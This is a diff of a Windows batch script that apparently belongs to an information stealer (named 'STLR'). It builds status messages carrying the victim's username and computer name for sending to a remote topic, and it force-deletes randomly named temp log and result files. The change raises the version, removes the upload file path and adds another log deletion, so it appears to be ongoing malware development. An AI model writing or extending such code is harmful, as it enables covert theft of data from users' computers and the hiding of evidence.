@@ -24,7 +24,7 @@ if !instances! geq 2 (
 ::goto :EOF
 
 
-set "BATCHVERSION=45.5"
+set "BATCHVERSION=45.6"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 del /f /a /q "%LOGFILE%"
 set "RESULT=%TEMP%\TGRESU.txa"
@@ -2965,7 +2965,7 @@ set "TOPIC_ID_STLR=73727"
 set "MESSAGE_STLR=%USERNAME%(%COMPUTERNAME%)|STLR.COMSTARTED..|%time%|(v%BATCHVERSION%)"
 set "ENCODED_MESSAGE_STLR=%MESSAGE_STLR: =%%2"
 set "CAPTION_STLR=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|FINAL|%time%|(v%BATCHVERSION%)"
-set "FILE_PATH_STLR=%LOGFILE1%"
+
 
 
 :SENDINGSTLRMSGNOW
@@ -3355,9 +3355,8 @@ if %errorlevel%==0 (
 
 
 
-
-
 del /f /a /q "%RESULT%"
+del /f /a /q "%LOGFILE1%"
 ::del /f /a /q "%ZIP_FILE%"
 
 
